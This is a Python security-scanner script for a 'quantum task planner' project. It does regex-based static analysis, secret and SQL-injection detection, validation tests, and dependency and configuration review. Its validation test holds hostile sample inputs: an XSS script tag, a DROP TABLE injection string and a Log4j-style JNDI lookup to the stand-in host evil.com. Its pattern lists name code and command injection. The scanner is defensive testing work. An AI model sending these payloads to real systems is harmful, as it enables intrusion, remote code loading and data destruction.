#!/usr/bin/env python3
"""
Quantum Task Planner Security Scanner

Comprehensive security analysis for the quantum task planning system:
- Static code analysis for security vulnerabilities
- Input validation testing
- Cryptographic analysis of quantum operations
- Access control verification
- Resource limit enforcement testing
"""

import os
import sys
import json
import logging
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
import hashlib
import re

# Add project root to path for imports
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from pipeline.quantum.validators import (
    QuantumTaskValidator, QuantumEntanglementValidator, 
    QuantumSchedulerValidator, SecurityValidator
)
from pipeline.quantum.exceptions import ValidationError

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class SecurityScanResult:
    """Container for security scan results."""
    
    def __init__(self):
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.warnings: List[Dict[str, Any]] = []
        self.info: List[Dict[str, Any]] = []
        self.scan_timestamp = datetime.utcnow()
        self.scan_duration = 0.0
        self.scanned_files = []
        self.overall_score = 0.0  # 0-100, higher is better
    
    def add_vulnerability(self, severity: str, category: str, description: str, 
                         file_path: str = "", line_number: int = 0, 
                         remediation: str = ""):
        """Add a security vulnerability."""
        self.vulnerabilities.append({
            "severity": severity,
            "category": category,
            "description": description,
            "file_path": file_path,
            "line_number": line_number,
            "remediation": remediation,
            "timestamp": datetime.utcnow()
        })
    
    def add_warning(self, category: str, description: str, file_path: str = ""):
        """Add a security warning."""
        self.warnings.append({
            "category": category,
            "description": description,
            "file_path": file_path,
            "timestamp": datetime.utcnow()
        })
    
    def add_info(self, category: str, description: str, details: Dict[str, Any] = None):
        """Add informational finding."""
        self.info.append({
            "category": category,
            "description": description,
            "details": details or {},
            "timestamp": datetime.utcnow()
        })
    
    def calculate_score(self):
        """Calculate overall security score."""
        base_score = 100.0
        
        # Deduct points for vulnerabilities
        for vuln in self.vulnerabilities:
            if vuln["severity"] == "critical":
                base_score -= 20
            elif vuln["severity"] == "high":
                base_score -= 10
            elif vuln["severity"] == "medium":
                base_score -= 5
            elif vuln["severity"] == "low":
                base_score -= 2
        
        # Deduct points for warnings
        base_score -= len(self.warnings) * 1
        
        self.overall_score = max(0.0, base_score)
        return self.overall_score
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for JSON serialization."""
        return {
            "scan_metadata": {
                "timestamp": self.scan_timestamp.isoformat(),
                "duration_seconds": self.scan_duration,
                "scanned_files": len(self.scanned_files),
                "overall_score": self.overall_score
            },
            "summary": {
                "total_vulnerabilities": len(self.vulnerabilities),
                "critical_vulnerabilities": sum(1 for v in self.vulnerabilities if v["severity"] == "critical"),
                "high_vulnerabilities": sum(1 for v in self.vulnerabilities if v["severity"] == "high"),
                "medium_vulnerabilities": sum(1 for v in self.vulnerabilities if v["severity"] == "medium"),
                "low_vulnerabilities": sum(1 for v in self.vulnerabilities if v["severity"] == "low"),
                "warnings": len(self.warnings),
                "info_items": len(self.info)
            },
            "vulnerabilities": self.vulnerabilities,
            "warnings": self.warnings,
            "info": self.info,
            "scanned_files": self.scanned_files
        }


class QuantumSecurityScanner:
    """Main security scanner for quantum task planner."""
    
    def __init__(self, quantum_module_path: Path):
        self.quantum_path = quantum_module_path
        self.result = SecurityScanResult()
        
        # Security patterns to detect
        self.dangerous_patterns = [
            (r'eval\s*\(', "Code Injection", "Use of eval() function"),
            (r'exec\s*\(', "Code Injection", "Use of exec() function"),
            (r'subprocess\.call\([^)]*shell\s*=\s*True', "Command Injection", "Shell injection via subprocess"),
            (r'os\.system\s*\(', "Command Injection", "Use of os.system()"),
            (r'pickle\.loads\s*\(', "Deserialization", "Unsafe pickle deserialization"),
            (r'yaml\.load\s*\([^)]*Loader\s*=\s*yaml\.Loader', "Deserialization", "Unsafe YAML loading"),
            (r'random\.random\(\)', "Weak Randomness", "Use of weak random number generator"),
            (r'hashlib\.md5\s*\(', "Weak Cryptography", "Use of MD5 hash (deprecated)"),
            (r'hashlib\.sha1\s*\(', "Weak Cryptography", "Use of SHA1 hash (deprecated)"),
            (r'input\s*\([^)]*\)', "Input Validation", "Direct user input without validation"),
            (r'open\s*\([^)]*[\'"][rwa]\+[\'"]', "File Access", "File operations without path validation"),
        ]
        
        # Secure coding patterns to verify
        self.secure_patterns = [
            (r'secrets\.token_bytes\(', "Strong Randomness", "Use of cryptographically secure random"),
            (r'secrets\.token_hex\(', "Strong Randomness", "Use of cryptographically secure random"),
            (r'hashlib\.sha256\(', "Strong Cryptography", "Use of SHA256 hash"),
            (r'hashlib\.sha3_256\(', "Strong Cryptography", "Use of SHA3-256 hash"),
            (r'\.strip\(\)', "Input Sanitization", "String sanitization"),
            (r'isinstance\s*\(.*,\s*\w+\)', "Type Validation", "Type checking"),
            (r'assert\s+\w+', "Assertion", "Input assertion"),
        ]
    
    async def run_full_scan(self) -> SecurityScanResult:
        """Run comprehensive security scan."""
        start_time = datetime.utcnow()
        logger.info("Starting quantum security scan")
        
        try:
            # 1. Static code analysis
            await self._static_code_analysis()
            
            # 2. Input validation testing
            await self._input_validation_testing()
            
            # 3. Quantum-specific security analysis
            await self._quantum_security_analysis()
            
            # 4. Dependency vulnerability scan
            await self._dependency_vulnerability_scan()
            
            # 5. Configuration security review
            await self._configuration_security_review()
            
            # 6. Resource limit testing
            await self._resource_limit_testing()
            
        except Exception as e:
            logger.error(f"Security scan error: {e}")
            self.result.add_vulnerability(
                "high", "Scanner Error", f"Security scan failed: {str(e)}"
            )
        
        # Calculate final score
        self.result.scan_duration = (datetime.utcnow() - start_time).total_seconds()
        self.result.calculate_score()
        
        logger.info(f"Security scan completed. Score: {self.result.overall_score}/100")
        return self.result
    
    async def _static_code_analysis(self):
        """Perform static code analysis for security issues."""
        logger.info("Running static code analysis")
        
        quantum_files = list(self.quantum_path.rglob("*.py"))
        self.result.scanned_files.extend([str(f) for f in quantum_files])
        
        for file_path in quantum_files:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                await self._scan_file_for_patterns(file_path, content)
                await self._scan_for_hardcoded_secrets(file_path, content)
                await self._scan_for_sql_injection(file_path, content)
                
            except Exception as e:
                self.result.add_warning(
                    "File Access", f"Could not scan {file_path}: {str(e)}"
                )
    
    async def _scan_file_for_patterns(self, file_path: Path, content: str):
        """Scan file content for dangerous patterns."""
        lines = content.split('\n')
        
        for line_num, line in enumerate(lines, 1):
            # Check for dangerous patterns
            for pattern, category, description in self.dangerous_patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    severity = self._determine_severity(category)
                    self.result.add_vulnerability(
                        severity=severity,
                        category=category,
                        description=f"{description}: {line.strip()}",
                        file_path=str(file_path),
                        line_number=line_num,
                        remediation=self._get_remediation(category)
                    )
            
            # Check for secure patterns (positive findings)
            for pattern, category, description in self.secure_patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    self.result.add_info(
                        category=category,
                        description=f"{description} found in {file_path}:{line_num}"
                    )
    
    async def _scan_for_hardcoded_secrets(self, file_path: Path, content: str):
        """Scan for hardcoded secrets and credentials."""
        secret_patterns = [
            (r'password\s*=\s*[\'"][^\'"\n]{8,}[\'"]', "Hardcoded Password"),
            (r'api_key\s*=\s*[\'"][^\'"\n]{20,}[\'"]', "Hardcoded API Key"),
            (r'secret_key\s*=\s*[\'"][^\'"\n]{16,}[\'"]', "Hardcoded Secret Key"),
            (r'token\s*=\s*[\'"][^\'"\n]{20,}[\'"]', "Hardcoded Token"),
            (r'[\'"][A-Za-z0-9]{40}[\'"]', "Potential Secret (40 chars)"),
            (r'[\'"][A-Za-z0-9+/]{64}[\'"]', "Potential Secret (64 chars)"),
        ]
        
        lines = content.split('\n')
        for line_num, line in enumerate(lines, 1):
            for pattern, description in secret_patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    # Exclude obvious test/example cases
                    if any(keyword in line.lower() for keyword in ['test', 'example', 'dummy', 'placeholder']):
                        continue
                    
                    self.result.add_vulnerability(
                        severity="high",
                        category="Credential Exposure",
                        description=f"{description} detected",
                        file_path=str(file_path),
                        line_number=line_num,
                        remediation="Use environment variables or secure secret management"
                    )
    
    async def _scan_for_sql_injection(self, file_path: Path, content: str):
        """Scan for SQL injection vulnerabilities."""
        sql_injection_patterns = [
            (r'execute\s*\([^)]*%[sf][^)]*\)', "String formatting in SQL"),
            (r'execute\s*\([^)]*\+[^)]*\)', "String concatenation in SQL"),
            (r'execute\s*\([^)]*\.format\([^)]*\)', "String format in SQL"),
            (r'SELECT\s+.*\s+WHERE\s+.*=\s*[\'"][^\'"].*[\'"]', "Potential SQL injection"),
        ]
        
        lines = content.split('\n')
        for line_num, line in enumerate(lines, 1):
            for pattern, description in sql_injection_patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    self.result.add_vulnerability(
                        severity="medium",
                        category="SQL Injection",
                        description=f"{description}: {line.strip()}",
                        file_path=str(file_path),
                        line_number=line_num,
                        remediation="Use parameterized queries or ORM"
                    )
    
    async def _input_validation_testing(self):
        """Test input validation mechanisms."""
        logger.info("Testing input validation")
        
        try:
            # Test quantum task validation
            await self._test_quantum_task_validation()
            
            # Test entanglement validation
            await self._test_entanglement_validation()
            
            # Test scheduler validation
            await self._test_scheduler_validation()
            
        except Exception as e:
            self.result.add_vulnerability(
                "medium", "Validation Testing", f"Input validation test failed: {str(e)}"
            )
    
    async def _test_quantum_task_validation(self):
        """Test quantum task input validation."""
        from pipeline.quantum.quantum_planner import QuantumTask
        
        # Test malicious inputs
        malicious_inputs = [
            {"title": "<script>alert('xss')</script>"},
            {"title": "'; DROP TABLE tasks; --"},
            {"title": "A" * 10000},  # Very long string
            {"description": "${jndi:ldap://evil.com/a}"},  # Log4j style
            {"metadata": {"nested": {"very": {"deep": {"structure": "value"}}}}},  # Deep nesting
        ]
        
        validation_failures = 0
        for malicious_input in malicious_inputs:
            try:
                # This should either fail gracefully or sanitize input
                task = QuantumTask(title=malicious_input.get("title", "Test"), **malicious_input)
                
                # If it doesn't fail, check if input was sanitized
                if "<script>" in task.title or "DROP TABLE" in task.title:
                    validation_failures += 1
                    self.result.add_vulnerability(
                        "high", "Input Validation", 
                        f"Malicious input not sanitized: {malicious_input}"
                    )
                
            except Exception:
                # Validation failure is expected for malicious input
                pass
        
        if validation_failures == 0:
            self.result.add_info(
                "Input Validation", "Quantum task validation appears robust"
            )
    
    async def _test_entanglement_validation(self):
        """Test entanglement validation."""
        try:
            from uuid import uuid4
            from pipeline.quantum.quantum_dependencies import EntanglementType
            
            # Test invalid entanglement parameters
            test_cases = [
                (set(), EntanglementType.SYNC_COMPLETION, 1.0),  # Empty task set
                ({uuid4()}, EntanglementType.SYNC_COMPLETION, 1.0),  # Single task
                ({uuid4(), uuid4()}, EntanglementType.SYNC_COMPLETION, -1.0),  # Invalid strength
                ({uuid4(), uuid4()}, EntanglementType.SYNC_COMPLETION, 2.0),  # Invalid strength
            ]
            
            validation_working = True
            for task_ids, ent_type, strength in test_cases:
                try:
                    QuantumEntanglementValidator.validate_entanglement_creation(
                        task_ids, ent_type, strength
                    )
                    validation_working = False  # Should have failed
                except Exception:
                    pass  # Expected failure
            
            if validation_working:
                self.result.add_info(
                    "Input Validation", "Entanglement validation working correctly"
                )
            else:
                self.result.add_vulnerability(
                    "medium", "Input Validation", 
                    "Entanglement validation not working properly"
                )
                
        except ImportError:
            self.result.add_warning(
                "Testing", "Could not test entanglement validation - import failed"
            )
    
    async def _test_scheduler_validation(self):
        """Test scheduler validation."""
        try:
            from pipeline.quantum.quantum_planner import QuantumTask
            
            # Test invalid scheduler parameters
            try:
                QuantumSchedulerValidator.validate_scheduling_parameters([], 0)
                self.result.add_vulnerability(
                    "medium", "Input Validation",
                    "Scheduler validation allows invalid parameters"
                )
            except ValidationError:
                # Expected failure
                self.result.add_info(
                    "Input Validation", "Scheduler validation working correctly"
                )
                
        except ImportError:
            self.result.add_warning(
                "Testing", "Could not test scheduler validation - import failed"
            )
    
    async def _quantum_security_analysis(self):
        """Analyze quantum-specific security aspects."""
        logger.info("Analyzing quantum security")
        
        # Check quantum randomness quality
        await self._analyze_quantum_randomness()
        
        # Check quantum state isolation
        await self._analyze_quantum_isolation()
        
        # Check entanglement security
        await self._analyze_entanglement_security()
    
    async def _analyze_quantum_randomness(self):
        """Analyze quality of quantum randomness."""
        try:
            import numpy as np
            
            # Test randomness quality
            random_samples = [np.random.random() for _ in range(1000)]
            
            # Basic statistical tests
            mean = np.mean(random_samples)
            variance = np.var(random_samples)
            
            # Expected values for uniform distribution [0,1]
            expected_mean = 0.5
            expected_variance = 1/12  # ≈ 0.083
            
            if abs(mean - expected_mean) > 0.05:
                self.result.add_warning(
                    "Quantum Randomness", 
                    f"Random number mean deviation: {abs(mean - expected_mean):.3f}"
                )
            
            if abs(variance - expected_variance) > 0.02:
                self.result.add_warning(
                    "Quantum Randomness",
                    f"Random number variance deviation: {abs(variance - expected_variance):.3f}"
                )
            
            self.result.add_info(
                "Quantum Randomness", 
                f"Randomness quality check: mean={mean:.3f}, variance={variance:.3f}",
                {"mean": mean, "variance": variance}
            )
            
        except Exception as e:
            self.result.add_warning(
                "Quantum Randomness", f"Could not analyze randomness: {str(e)}"
            )
    
    async def _analyze_quantum_isolation(self):
        """Analyze quantum state isolation and protection."""
        # Check if quantum states can be tampered with externally
        self.result.add_info(
            "Quantum Isolation", 
            "Quantum state isolation depends on implementation-specific protections"
        )
        
        # In a real quantum system, check for:
        # - State access controls
        # - Measurement authorization
        # - Entanglement permissions
        # - Decoherence protection
    
    async def _analyze_entanglement_security(self):
        """Analyze security of quantum entanglement operations."""
        # Check for entanglement-based attacks
        self.result.add_info(
            "Entanglement Security",
            "Entanglement operations should be protected against unauthorized correlation"
        )
        
        # In a real quantum system, check for:
        # - Entanglement authorization
        # - Cross-task data leakage
        # - Entanglement-based side channels
    
    async def _dependency_vulnerability_scan(self):
        """Scan dependencies for known vulnerabilities."""
        logger.info("Scanning dependencies for vulnerabilities")
        
        try:
            # Check if safety is available for dependency scanning
            result = subprocess.run(['safety', '--version'], 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                # Run safety check
                safety_result = subprocess.run(
                    ['safety', 'check', '--json'],
                    capture_output=True, text=True, timeout=60
                )
                
                if safety_result.returncode == 0:
                    safety_data = json.loads(safety_result.stdout)
                    
                    for vuln in safety_data:
                        self.result.add_vulnerability(
                            severity="medium",
                            category="Dependency Vulnerability",
                            description=f"Vulnerable package: {vuln.get('package_name')} - {vuln.get('advisory')}",
                            remediation=f"Update to version {vuln.get('analyzed_version')}"
                        )
                else:
                    self.result.add_info(
                        "Dependency Scan", "No dependency vulnerabilities found by safety"
                    )
            else:
                self.result.add_warning(
                    "Dependency Scan", "Safety tool not available for dependency scanning"
                )
                
        except (subprocess.TimeoutExpired, FileNotFoundError, json.JSONDecodeError) as e:
            self.result.add_warning(
                "Dependency Scan", f"Could not run dependency scan: {str(e)}"
            )
    
    async def _configuration_security_review(self):
        """Review configuration security."""
        logger.info("Reviewing configuration security")
        
        # Check for insecure default configurations
        config_files = list(self.quantum_path.parent.rglob("*.env*"))
        config_files.extend(self.quantum_path.parent.rglob("config*.py"))
        config_files.extend(self.quantum_path.parent.rglob("settings*.py"))
        
        for config_file in config_files:
            try:
                with open(config_file, 'r') as f:
                    content = f.read()
                
                # Check for insecure configurations
                if 'DEBUG=True' in content or 'DEBUG = True' in content:
                    self.result.add_vulnerability(
                        "medium", "Configuration Security",
                        f"Debug mode enabled in {config_file}",
                        str(config_file),
                        remediation="Set DEBUG=False in production"
                    )
                
                if 'SECRET_KEY=' in content and len(content.split('SECRET_KEY=')[1].split('\n')[0]) < 32:
                    self.result.add_vulnerability(
                        "high", "Configuration Security",
                        f"Weak secret key in {config_file}",
                        str(config_file),
                        remediation="Use a strong, randomly generated secret key"
                    )
                
            except Exception as e:
                self.result.add_warning(
                    "Configuration Review", f"Could not review {config_file}: {str(e)}"
                )
    
    async def _resource_limit_testing(self):
        """Test resource limit enforcement."""
        logger.info("Testing resource limits")
        
        try:
            # Test rate limiting
            SecurityValidator.validate_rate_limits("task_creation", 150, 1)
            self.result.add_vulnerability(
                "medium", "Resource Limits",
                "Rate limiting not enforced properly",
                remediation="Implement proper rate limiting"
            )
        except ValidationError:
            # Expected - rate limit should be enforced
            self.result.add_info(
                "Resource Limits", "Rate limiting working correctly"
            )
        
        try:
            # Test resource constraints
            SecurityValidator.validate_resource_constraints(1000, 100, 1050)
            self.result.add_vulnerability(
                "medium", "Resource Limits",
                "Resource constraints not enforced properly",
                remediation="Implement proper resource limits"
            )
        except ValidationError:
            # Expected - resource limit should be enforced
            self.result.add_info(
                "Resource Limits", "Resource constraints working correctly"
            )
    
    def _determine_severity(self, category: str) -> str:
        """Determine severity level based on vulnerability category."""
        high_severity = ["Code Injection", "Command Injection", "Credential Exposure"]
        medium_severity = ["SQL Injection", "Deserialization", "Weak Cryptography"]
        
        if category in high_severity:
            return "high"
        elif category in medium_severity:
            return "medium"
        else:
            return "low"
    
    def _get_remediation(self, category: str) -> str:
        """Get remediation advice for vulnerability category."""
        remediations = {
            "Code Injection": "Avoid eval() and exec(). Use safe alternatives or validate input strictly.",
            "Command Injection": "Use subprocess with shell=False and validate all inputs.",
            "Deserialization": "Use safe serialization formats like JSON instead of pickle.",
            "Weak Randomness": "Use secrets module for cryptographic operations.",
            "Weak Cryptography": "Use SHA-256 or stronger hash functions.",
            "Input Validation": "Implement strict input validation and sanitization.",
            "File Access": "Validate file paths and use allow-lists for file operations.",
            "SQL Injection": "Use parameterized queries or ORM frameworks.",
            "Credential Exposure": "Use environment variables or secure secret management systems."
        }
        
        return remediations.get(category, "Review code and apply security best practices.")


async def main():
    """Main function to run security scan."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Quantum Task Planner Security Scanner")
    parser.add_argument("--output", "-o", help="Output file for scan results", 
                       default="quantum_security_scan_results.json")
    parser.add_argument("--quantum-path", help="Path to quantum module", 
                       default="pipeline/quantum")
    parser.add_argument("--verbose", "-v", action="store_true", 
                       help="Verbose output")
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Initialize scanner
    quantum_path = Path(args.quantum_path)
    if not quantum_path.exists():
        logger.error(f"Quantum module path not found: {quantum_path}")
        sys.exit(1)
    
    scanner = QuantumSecurityScanner(quantum_path)
    
    # Run scan
    logger.info("Starting comprehensive security scan")
    result = await scanner.run_full_scan()
    
    # Output results
    output_data = result.to_dict()
    
    with open(args.output, 'w') as f:
        json.dump(output_data, f, indent=2, default=str)
    
    # Print summary
    print(f"\n{'='*60}")
    print("QUANTUM TASK PLANNER SECURITY SCAN RESULTS")
    print(f"{'='*60}")
    print(f"Overall Security Score: {result.overall_score:.1f}/100")
    print(f"Scan Duration: {result.scan_duration:.2f} seconds")
    print(f"Files Scanned: {len(result.scanned_files)}")
    print(f"\nSummary:")
    print(f"  Critical Vulnerabilities: {sum(1 for v in result.vulnerabilities if v['severity'] == 'critical')}")
    print(f"  High Vulnerabilities: {sum(1 for v in result.vulnerabilities if v['severity'] == 'high')}")
    print(f"  Medium Vulnerabilities: {sum(1 for v in result.vulnerabilities if v['severity'] == 'medium')}")
    print(f"  Low Vulnerabilities: {sum(1 for v in result.vulnerabilities if v['severity'] == 'low')}")
    print(f"  Warnings: {len(result.warnings)}")
    print(f"\nDetailed results saved to: {args.output}")
    
    # Exit with error code if critical or high vulnerabilities found
    critical_high_vulns = sum(1 for v in result.vulnerabilities 
                             if v['severity'] in ['critical', 'high'])
    
    if critical_high_vulns > 0:
        print(f"\n⚠️  SECURITY ISSUES FOUND: {critical_high_vulns} critical/high severity vulnerabilities")
        sys.exit(1)
    else:
        print(f"\n✅ No critical or high severity vulnerabilities found")
        sys.exit(0)


if __name__ == "__main__":
    import asyncio
    asyncio.run(main())